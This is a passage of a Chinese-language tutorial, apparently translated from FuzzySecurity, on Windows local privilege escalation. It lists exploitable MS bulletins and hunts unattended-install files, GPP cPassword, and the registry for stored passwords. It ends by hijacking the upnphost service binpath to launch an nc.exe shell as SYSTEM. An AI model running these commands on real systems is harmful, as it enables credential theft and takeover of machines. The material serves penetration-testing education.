(2003/2008/7/8/2012)</div><div class="line">MS15-077 　[KB3077657]　　[ATM]　　(XP/Vista/Win7/Win8/2000/2003/2008/2012)</div><div class="line">MS15-061 　[KB3057839]　　[Kernel Driver]　　(2003/2008/7/8/2012)</div><div class="line">MS15-051 　[KB3057191]　　[Windows Kernel Mode Drivers]　　(2003/2008/7/8/2012)</div><div class="line">MS15-015 　[KB3031432]　　[Kernel Driver]　　(Win7/8/8.1/2012/RT/2012 R2/2008 R2)</div><div class="line">MS15-010 　[KB3036220]　　[Kernel Driver]　　(2003/2008/7/8)</div><div class="line">MS15-001 　[KB3023266]　　[Kernel Driver]　　(2008/2012/7/8)</div><div class="line">MS14-070 　[KB2989935]　　[Kernel Driver]　　(2003)</div><div class="line">MS14-068 　[KB3011780]　　[Domain Privilege Escalation]　　(2003/2008/2012/7/8)</div><div class="line">MS14-058 　[KB3000061]　　[Win32k.sys]　　(2003/2008/2012/7/8)</div><div class="line">MS14-040 　[KB2975684]　　[AFD Driver]　　(2003/2008/2012/7/8)</div><div class="line">MS14-002 　[KB2914368]　　[NDProxy]　　(2003/XP)</div><div class="line">MS13-053 　[KB2850851]　　[win32k.sys]　　(XP/Vista/2003/2008/win 7)</div><div class="line">MS13-046 　[KB2840221]　　[dxgkrnl.sys]　　(Vista/2003/2008/2012/7)</div><div class="line">MS13-005 　[KB2778930]　　[Kernel Mode Driver]　　(2003/2008/2012/win7/8)</div><div class="line">MS12-042 　[KB2972621]　　[Service Bus]　　(2008/2012/win7)</div><div class="line">MS12-020 　[KB2671387]　　[RDP]　　(2003/2008/7/XP)</div><div class="line">MS11-080 　[KB2592799]　　[AFD.sys]　　(2003/XP)</div><div class="line">MS11-062 　[KB2566454]　　[NDISTAPI]　　(2003/XP)</div><div class="line">MS11-046 　[KB2503665]　　[AFD.sys]　　(2003/2008/7/XP)</div><div class="line">MS11-011 　[KB2393802]　　[kernel Driver]　　(2003/2008/7/XP/Vista)</div><div class="line">MS10-092 　[KB2305420]　　[Task Scheduler]　　(2008/7)</div><div class="line">MS10-065 　[KB2267960]　　[FastCGI]　　(IIS 5.1, 6.0, 7.0, and 7.5)</div><div class="line">MS10-059 　[KB982799]　　 [ACL-Churraskito]　　(2008/7/Vista)</div><div class="line">MS10-048 　[KB2160329]　　[win32k.sys]　　(XP SP2 &amp; SP3/2003 SP2/Vista SP1 &amp; SP2/2008 Gold &amp; SP2 &amp; R2/Win7)</div><div class="line">MS10-015 　[KB977165]　　 [KiTrap0D]　　(2003/2008/7/XP)</div><div class="line">MS10-012 　[KB971468]　　[SMB Client Trans2 stack overflow]　　(Windows 7/2008R2)</div><div class="line">MS09-050 　[KB975517]　　 [Remote Code Execution]　　(2008/Vista)</div><div class="line">MS09-020 　[KB970483]　　 [IIS 6.0]　　(IIS 5.1 and 6.0)</div><div class="line">MS09-012 　[KB959454]　　 [Chimichurri]　　(Vista/win7/2008/Vista)</div><div class="line">MS08-068 　[KB957097]　　 [Remote Code Execution]　　(2000/XP)</div><div class="line">MS08-067 　[KB958644]　　 [Remote Code Execution]　　(Windows 2000/XP/Server 2003/Vista/Server 2008)</div><div class="line">MS08-066 　[KB956803]　　 [AFD.sys]　　(Windows 2000/XP/Server 2003)</div><div class="line">MS08-025 　[KB941693]　　 [Win32.sys]　　(XP/2003/2008/Vista)</div><div class="line">MS06-040 　[KB921883]　　 [Remote Code Execution]　　(2003/xp/2000)</div><div class="line">MS05-039 　[KB899588]　　 [PnP Service]　　(Win 9X/ME/NT/2000/XP/2003)</div><div class="line">MS03-026 　[KB823980]　　 [Buffer Overrun In RPC Interface]　　(/NT/2000/XP/2003)</div></pre></td></tr></table></figure>
<h4 id="下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。"><a href="#下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。" class="headerlink" title="下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。"></a>下一个情景是如果某个环境中有大量的机器需要被安装，那么技术人员通常不会一个接一个机器的去安装，他们通常会选择自动化安装，这就可能会遗留下安装过程的配置文件，这些配置文件中会包含许多敏感信息，例如管理员账号密码，如果能得到这些信息将极大的帮助我们提权。</h4><h4 id="通常这些敏感文件会出现在下面目录中："><a href="#通常这些敏感文件会出现在下面目录中：" class="headerlink" title="通常这些敏感文件会出现在下面目录中："></a>通常这些敏感文件会出现在下面目录中：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">c:\sysprep.inf</div><div class="line">c:\sysprep\sysprep.xml</div><div class="line">%WINDIR%\Panther\Unattend\Unattended.xml</div><div class="line">%WINDIR%\Panther\Unattended.xml</div></pre></td></tr></table></figure>
<h4 id="这些配置文件极可能包含明文密码，也可能会出现base64-编码的情况，下面是一些配置文件的事例："><a href="#这些配置文件极可能包含明文密码，也可能会出现base64-编码的情况，下面是一些配置文件的事例：" class="headerlink" title="这些配置文件极可能包含明文密码，也可能会出现base64 编码的情况，下面是一些配置文件的事例："></a>这些配置文件极可能包含明文密码，也可能会出现base64 编码的情况，下面是一些配置文件的事例：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"># This is a sample from sysprep.inf with clear-text credentials.</div><div class="line"></div><div class="line">[GuiUnattended]</div><div class="line">OEMSkipRegional=1</div><div class="line">OemSkipWelcome=1</div><div class="line">AdminPassword=s3cr3tp4ssw0rd</div><div class="line">TimeZone=20</div><div class="line"></div><div class="line"># This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not</div><div class="line">encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;.</div><div class="line"></div><div class="line">&lt;LocalAccounts&gt;</div><div class="line">    &lt;LocalAccount wcm:action=&quot;add&quot;&gt;</div><div class="line">        &lt;Password&gt;</div><div class="line">            &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</div><div class="line">            &lt;PlainText&gt;false&lt;/PlainText&gt;</div><div class="line">        &lt;/Password&gt;</div><div class="line">        &lt;Description&gt;Local Administrator&lt;/Description&gt;</div><div class="line">        &lt;DisplayName&gt;Administrator&lt;/DisplayName&gt;</div><div class="line">        &lt;Group&gt;Administrators&lt;/Group&gt;</div><div class="line">        &lt;Name&gt;Administrator&lt;/Name&gt;</div><div class="line">    &lt;/LocalAccount&gt;</div><div class="line">&lt;/LocalAccounts&gt;</div><div class="line"></div><div class="line"># Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding.</div><div class="line"></div><div class="line">&lt;AutoLogon&gt;</div><div class="line">    &lt;Password&gt;</div><div class="line">        &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA==&lt;/Value&gt;</div><div class="line">        &lt;PlainText&gt;false&lt;/PlainText&gt;</div><div class="line">    &lt;/Password&gt;</div><div class="line">    &lt;Enabled&gt;true&lt;/Enabled&gt;</div><div class="line">    &lt;Username&gt;Administrator&lt;/Username&gt;</div><div class="line">&lt;/AutoLogon&gt;</div></pre></td></tr></table></figure>
<h4 id="GPO-首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL-中的Groups-xml-文件，任何经过身份认证的用户都可以读取该文件。尽管xml-文件中的密码通过使用AES-加密来保证安全性，但是通过msdn-发布的静态密钥可以很轻松的解密。"><a href="#GPO-首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL-中的Groups-xml-文件，任何经过身份认证的用户都可以读取该文件。尽管xml-文件中的密码通过使用AES-加密来保证安全性，但是通过msdn-发布的静态密钥可以很轻松的解密。" class="headerlink" title="GPO 首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL 中的Groups.xml 文件，任何经过身份认证的用户都可以读取该文件。尽管xml 文件中的密码通过使用AES 加密来保证安全性，但是通过msdn 发布的静态密钥可以很轻松的解密。"></a>GPO 首选项文件可用于在域计算机上创建本地用户，当你控制的主机连接在域中时，那么就非常值得去看看存储在SYSVOL 中的Groups.xml 文件，任何经过身份认证的用户都可以读取该文件。尽管xml 文件中的密码通过使用AES 加密来保证安全性，但是通过msdn 发布的静态密钥可以很轻松的解密。</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv05_big.png" alt=""></p>
<h4 id="除了Groups-xml-以外，其他几个策略首选项文件也可能存在-“cPassword”-属性"><a href="#除了Groups-xml-以外，其他几个策略首选项文件也可能存在-“cPassword”-属性" class="headerlink" title="除了Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性"></a>除了Groups.xml 以外，其他几个策略首选项文件也可能存在 “cPassword” 属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Services\Services.xml: Element-Specific Attributes</div><div class="line">ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element</div><div class="line">Printers\Printers.xml: SharedPrinter Element</div><div class="line">Drives\Drives.xml: Element-Specific Attributes</div><div class="line">DataSources\DataSources.xml: Element-Specific Attributes</div></pre></td></tr></table></figure>
<h4 id="如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。"><a href="#如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。" class="headerlink" title="如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。"></a>如下所示，可以通过手动浏览SYSVOL并获取相关文件来利用此漏洞。</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv06_big.png" alt=""></p>
<h4 id="除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。"><a href="#除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。" class="headerlink" title="除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。"></a>除了上面手动查找首选项文件之外，我们也可以利用自动化工具来帮助我们达到目的。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">可以利用 msf 中的一个后渗透模块来实现自动化 [post/windows/gather/credentials/gpp](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)</div></pre></td></tr></table></figure>
<h4 id="接下来我们要查找一个奇怪的注册表设置-“AlwaysInstallElevated”-如果启动此设置，它会允许任何用户将-msi-文件安装为NT-AUTHORITY-SYSTEM-。"><a href="#接下来我们要查找一个奇怪的注册表设置-“AlwaysInstallElevated”-如果启动此设置，它会允许任何用户将-msi-文件安装为NT-AUTHORITY-SYSTEM-。" class="headerlink" title="接下来我们要查找一个奇怪的注册表设置 “AlwaysInstallElevated” , 如果启动此设置，它会允许任何用户将 *.msi 文件安装为NT AUTHORITY \ SYSTEM 。"></a>接下来我们要查找一个奇怪的注册表设置 “AlwaysInstallElevated” , 如果启动此设置，它会允许任何用户将 *.msi 文件安装为NT AUTHORITY \ SYSTEM 。</h4><h4 id="为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出-SYSTEM-shell-通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7-并没有这两个键值。"><a href="#为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出-SYSTEM-shell-通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7-并没有这两个键值。" class="headerlink" title="为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出 SYSTEM shell. 通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7 并没有这两个键值。"></a>为了能够利用这个，我们需要检查两个注册表项是否已经设置，如果在这种情况下我们能够弹出 SYSTEM shell. 通过下面的命令可以查看注册表项是否启动。不过笔者测试时发现自己的Windows7 并没有这两个键值。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div><div class="line">C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div></pre></td></tr></table></figure>
<h4 id="最后我们也可能通过下面的命令来挖到未知的宝藏"><a href="#最后我们也可能通过下面的命令来挖到未知的宝藏" class="headerlink" title="最后我们也可能通过下面的命令来挖到未知的宝藏"></a>最后我们也可能通过下面的命令来挖到未知的宝藏</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># The command below will search the file system for file names containing certain keywords. You can</div><div class="line">specify as many keywords as you wish.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; dir /s *pass* == *cred* == *vnc* == *.config*</div><div class="line"></div><div class="line"># Search certain file types for a keyword, this can generate a lot of output.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; findstr /si password *.xml *.ini *.txt</div><div class="line"></div><div class="line"># Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s</div><div class="line">C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s</div></pre></td></tr></table></figure>
<h2 id="Δt-for-t7-to-t10-Roll-Up-Your-Sleeves"><a href="#Δt-for-t7-to-t10-Roll-Up-Your-Sleeves" class="headerlink" title="Δt for t7 to t10 - Roll Up Your Sleeves"></a>Δt for t7 to t10 - Roll Up Your Sleeves</h2><h4 id="希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows-服务和文件-文件夹-权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows-XP-系统"><a href="#希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows-服务和文件-文件夹-权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows-XP-系统" class="headerlink" title="希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows 服务和文件/文件夹 权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows XP 系统"></a>希望到目前为止我们已经成功提权，如果确实还没有成功提权的话下面还有一些攻击方法。在这最后一部分，我们会查看Windows 服务和文件/文件夹 权限，我们的目的是利用弱权限来进行提权。当然这里最主要是针对Windows XP 系统</h4><h4 id="接下来我们将利用一个Windows中大神级的工具集Sysinternals-Suite-中的accesschk-exe-来批量检查权限信息，读者可以从这里下载这个工具集"><a href="#接下来我们将利用一个Windows中大神级的工具集Sysinternals-Suite-中的accesschk-exe-来批量检查权限信息，读者可以从这里下载这个工具集" class="headerlink" title="接下来我们将利用一个Windows中大神级的工具集Sysinternals Suite 中的accesschk.exe 来批量检查权限信息，读者可以从这里下载这个工具集"></a>接下来我们将利用一个Windows中大神级的工具集Sysinternals Suite 中的accesschk.exe 来批量检查权限信息，读者可以从这里<a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="external">下载这个工具集</a></h4><h4 id="接下来我们从Windows-的服务开始，通过重新配置service-的参数能够让我们快速达到目的。"><a href="#接下来我们从Windows-的服务开始，通过重新配置service-的参数能够让我们快速达到目的。" class="headerlink" title="接下来我们从Windows 的服务开始，通过重新配置service 的参数能够让我们快速达到目的。"></a>接下来我们从Windows 的服务开始，通过重新配置service 的参数能够让我们快速达到目的。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># We can use sc to query, configure and manage windows services.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; sc qc Spooler</div><div class="line"></div><div class="line">[SC] QueryServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: Spooler</div><div class="line">        TYPE               : 110  WIN32_OWN_PROCESS (interactive)</div><div class="line">        START_TYPE         : 2   AUTO_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\Windows\System32\spoolsv.exe</div><div class="line">        LOAD_ORDER_GROUP   : SpoolerGroup</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Print Spooler</div><div class="line">        DEPENDENCIES       : RPCSS</div><div class="line">                           : http</div><div class="line">        SERVICE_START_NAME : LocalSystem</div></pre></td></tr></table></figure>
<h4 id="我们也可以使用accesschk-来检查每个服务的权限级别"><a href="#我们也可以使用accesschk-来检查每个服务的权限级别" class="headerlink" title="我们也可以使用accesschk 来检查每个服务的权限级别"></a>我们也可以使用accesschk 来检查每个服务的权限级别</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"># We can see the permissions that each user level has, you can also use &quot;accesschk.exe -ucqv *&quot; to list</div><div class="line">all services.</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -ucqv Spooler</div><div class="line"></div><div class="line">Spooler</div><div class="line"></div><div class="line">  R  NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_QUERY_STATUS</div><div class="line">        SERVICE_QUERY_CONFIG</div><div class="line">        SERVICE_INTERROGATE</div><div class="line">        SERVICE_ENUMERATE_DEPENDENTS</div><div class="line">        SERVICE_USER_DEFINED_CONTROL</div><div class="line">        READ_CONTROL</div><div class="line">  R  BUILTIN\Power Users</div><div class="line">        SERVICE_QUERY_STATUS</div><div class="line">        SERVICE_QUERY_CONFIG</div><div class="line">        SERVICE_INTERROGATE</div><div class="line">        SERVICE_ENUMERATE_DEPENDENTS</div><div class="line">        SERVICE_START</div><div class="line">        SERVICE_USER_DEFINED_CONTROL</div><div class="line">        READ_CONTROL</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div></pre></td></tr></table></figure>
<h4 id="Accesschk-能够自动检查在某个用户等级下我们对于Windows-服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查-“Authenticated-Users”-。"><a href="#Accesschk-能够自动检查在某个用户等级下我们对于Windows-服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查-“Authenticated-Users”-。" class="headerlink" title="Accesschk 能够自动检查在某个用户等级下我们对于Windows 服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查 “Authenticated Users” 。"></a>Accesschk 能够自动检查在某个用户等级下我们对于Windows 服务是否具有写入权限。作为一个低权限的用户，我们通常会想要去检查 “Authenticated Users” 。</h4><h4 id="咱们来比较一下在Windows-8-和-Windows-XP-SP0-中输出的不同"><a href="#咱们来比较一下在Windows-8-和-Windows-XP-SP0-中输出的不同" class="headerlink" title="咱们来比较一下在Windows 8 和 Windows XP SP0 中输出的不同,"></a>咱们来比较一下在Windows 8 和 Windows XP SP0 中输出的不同,</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"># This is on Windows 8.</div><div class="line"></div><div class="line">C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</div><div class="line">No matching objects found.</div><div class="line"></div><div class="line"># On a default Windows XP SP0 we can see there is a pretty big security fail.</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; *</div><div class="line">RW SSDPSRV</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">RW upnphost</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">		</div><div class="line">C:\&gt; accesschk.exe -ucqv SSDPSRV</div><div class="line"></div><div class="line">SSDPSRV</div><div class="line"></div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Power Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\LOCAL SERVICE</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line"></div><div class="line">C:\&gt; accesschk.exe -ucqv upnphost</div><div class="line"></div><div class="line">upnphost</div><div class="line"></div><div class="line">  RW NT AUTHORITY\SYSTEM</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Administrators</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\Authenticated Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW BUILTIN\Power Users</div><div class="line">        SERVICE_ALL_ACCESS</div><div class="line">  RW NT AUTHORITY\LOCAL SERVICE</div><div class="line">        SERVICE_ALL_ACCESS</div></pre></td></tr></table></figure>
<h4 id="通过以上信息，我们能看到upnphost-具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹-system-shell"><a href="#通过以上信息，我们能看到upnphost-具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹-system-shell" class="headerlink" title="通过以上信息，我们能看到upnphost 具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹 system shell"></a>通过以上信息，我们能看到upnphost 具有很大的权限，下面我将演示一下如何实际应用这些信息来反弹 system shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">C:\&gt; sc qc upnphost</div><div class="line"></div><div class="line">[SC] GetServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: upnphost</div><div class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</div><div class="line">        START_TYPE         : 3   DEMAND_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService</div><div class="line">        LOAD_ORDER_GROUP   :</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</div><div class="line">        DEPENDENCIES       : SSDPSRV</div><div class="line">        SERVICE_START_NAME : NT AUTHORITY\LocalService</div><div class="line">		</div><div class="line">C:\&gt; sc config upnphost binpath= &quot;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&quot;</div><div class="line">[SC] ChangeServiceConfig SUCCESS</div><div class="line"></div><div class="line">C:\&gt; sc config upnphost obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</div><div class="line">[SC] ChangeServiceConfig SUCCESS</div><div class="line"></div><div class="line">C:\&gt; sc qc upnphost</div><div class="line"></div><div class="line">[SC] GetServiceConfig SUCCESS</div><div class="line"></div><div class="line">SERVICE_NAME: upnphost</div><div class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</div><div class="line">        START_TYPE         : 3   DEMAND_START</div><div class="line">        ERROR_CONTROL      : 1   NORMAL</div><div class="line">        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe</div><div class="line">        LOAD_ORDER_GROUP   :</div><div class="line">        TAG                : 0</div><div class="line">        DISPLAY_NAME       : Universal Plug and Play Device Host</div><div class="line">        DEPENDENCIES       : SSDPSRV</div><div class="line">        SERVICE_START_NAME : LocalSystem</div><div class="line">		</div><div class="line">C:\&gt; net start upnphost</div></pre></td></tr></table></figure>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180410151231_nF2KHi_Screenshot.jpeg" alt=""></p>
<h4 id="下图列出了关于Windows-提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM-shell"><a href="#下图列出了关于Windows-提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM-shell" class="headerlink" title="下图列出了关于Windows 提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM shell."></a>下图列出了关于Windows 提权的一些介绍，任何这些访问权限都将给我们带来SYSTEM shell.</h4><p><img src="http://www.fuzzysecurity.com/tutorials/images/priv02_big.png" alt=""></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><h4 id="以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥-hl0rey-的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！"><a href="#以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥-hl0rey-的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！" class="headerlink" title="以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥@hl0rey 的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！"></a>以上大部分都是根据外文翻译过来的，然后我做了适当修改，再次感谢大哥@hl0rey 的建议和帮助，下一篇文章将是我自己的思路总结，将会更有趣也更加容易操作！！</h4>]]></content>
    
    <summary type="html">
    
